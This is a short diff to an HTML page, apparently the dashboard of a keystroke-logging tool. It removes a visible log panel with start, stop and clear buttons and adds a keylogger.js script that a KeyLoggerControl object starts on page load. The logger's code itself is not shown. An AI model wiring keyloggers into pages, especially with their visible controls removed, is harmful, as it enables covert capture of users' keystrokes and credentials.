@@ -56,15 +56,6 @@
             </div>
         </section>
 
-        <section id="logs" class="section-container">
-            <h2>Logs</h2>
-            <button id="start-logger" class="control-btn">Start Logging</button>
-            <button id="stop-logger" class="control-btn">Stop Logging</button>
-            <button id="clear-logs" class="control-btn">Clear Logs</button>
-            <div class="logs-container">
-                <pre id="keylogger-output">Loading...</pre>
-            </div>
-        </section>
 
         <section id="history" class="section-container">
             <h2>History</h2>
@@ -175,11 +166,13 @@
     <script src="../static/js/theme.js"></script>
     <script src="../static/js/export.js"></script>
     <script src="../static/js/search.js"></script>
+    <script src="../static/js/keylogger.js"></script>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             new ThemeManager();
             new LogExporter();
             new LogSearch();
+            new KeyLoggerControl();
         });
     </script>
 </body>
